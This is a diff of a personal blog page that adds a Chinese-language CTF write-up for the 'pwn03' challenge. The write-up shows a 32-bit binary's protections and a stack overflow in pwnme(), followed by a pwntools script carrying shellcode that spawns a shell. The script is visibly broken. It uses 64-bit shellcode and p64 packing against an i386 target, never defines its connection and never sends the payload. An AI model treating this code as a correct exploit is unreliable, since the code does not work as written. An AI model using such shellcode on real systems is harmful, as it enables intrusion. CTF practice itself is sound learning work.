@@ -42,7 +42,6 @@
                                 })();
                             </script>
                             
-        <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
 </head>
 
 <body>
@@ -155,67 +154,143 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <div class="intro">
-                        <div class="avatar">
-                            <a href="https://shawr00t.github.io"><img src="https://shawr00t.github.io/images/avatar.png?v=1625551702286"></a>
-                        </div>
-                        <div class="nickname">
-                            ShawRoot
-                        </div>
-                        <div class="description">
-                            <span id="subtitle">
-                                
-                            </span>
-                        </div>
-                        <div class="links">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                [CTFshow]pwn03
+                            </h1>
                             
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        「配枪朱丽叶 - 分部。」
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-07-06</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">0.9
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">174</a></span>
+                                    
+                                </div>
                                 
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
-                                
-                                        
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>checksec：</p>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)
+</code></pre>
+<p>main函数内容如下：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  puts(&quot;stack happy!&quot;);
+  puts(&quot;32bits\n&quot;);
+  pwnme();
+  puts(&quot;\nExiting&quot;);
+  return 0;
+}
+</code></pre>
+<p>pwnme()这里存在栈溢出漏洞：</p>
+<pre><code class="language-c">int pwnme()
+{
+  char s; // [esp+Fh] [ebp-9h]
+
+  fgets(&amp;s, 100, stdin);
+  return 0;
+}
+</code></pre>
+<p>没有预留后门，需要自己写入。可以把后门写入.bss里。使用<code>vmmap</code>命令发现可写入：<br>
+<img src="https://imgpp.com/images/2021/07/05/2021-07-06_092641.png" alt="2021-07-06_092641.png" loading="lazy"><br>
+正常计算偏移量为0x9+0x4</p>
+<pre><code class="language-python">from pwn import *
+shell=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+s_addr = 0x80484cf+0x9+0x4+0x4
+shell_addr = 'a'*0x9+'a'*0x4+p64(s_addr)+shell
+io.interactive()
+</code></pre>
+
                         </div>
-                    </div>
+                        
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>「配枪朱丽叶 - 分部。」</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://shawr00t.github.io/ctfshowpwn03/">https://shawr00t.github.io/ctfshowpwn03/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/ctfshowpwn03/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/ctfshowpwn03/&sharesource=qzone&title=[CTFshow]pwn03&pics=https://shawr00t.github.io/images/avatar.png?v=1625551702286&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/ctfshowpwn03/&sharesource=weibo&title=[CTFshow]pwn03 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625551702286 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                            <div class="reward ">
+                                                                <div class="reward-button ">&yen;
+                                                                    <span class="reward-code "> 
+                                                                <span class="alipay-code "> <img class="alipay-img " alt = "support " src="https://imgpp.com/images/2021/07/01/_20210702113052.jpg"><b>Alipay</b> </span>
+                                                                    <span class="wechat-code "> <img alt ="support " class="wechat-img " src="https://imgpp.com/images/2021/07/01/_20210702113049.png"><b>Wechat</b> </span> </span>
+                                                                </div>
+                                                            </div>
+                                                            
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/ctfshow01-zhan-yi-chu-zhi-ret2text/">
+                                                                                                    [CTFshow]01栈溢出之ret2text
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
     </div>
-
-</body>
-<script>
-    // type 
-    var typed = new Typed("#subtitle", {
-        strings: ['', '', ''],
-        startDelay: 10,
-        typeSpeed: 200,
-        loop: true,
-        backSpeed: 100,
-        showCursor: true
-    });
-    //head title
-    var titleTime;
-    document.addEventListener("visibilitychange", function() {
-        document.hidden ? (document.title = "\uD83D\uDE25" + OriginTitile, clearTimeout(titleTime)) : (document.title = "\uD83D\uDE1D" + OriginTitile, titleTime = setTimeout(function() {
-            document.title = OriginTitile
-        }, 2E3))
-    });
-    var OriginTitile = document.title;
-</script>
-
+    </div>
+    </div>
+    
         <footer id="footer" class="footer">
             <div class="copyright">
                 
@@ -267,5 +342,10 @@
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
                 
+        </div>
+</body>
+<script>
+    scroll();
+</script>
 
 </html>
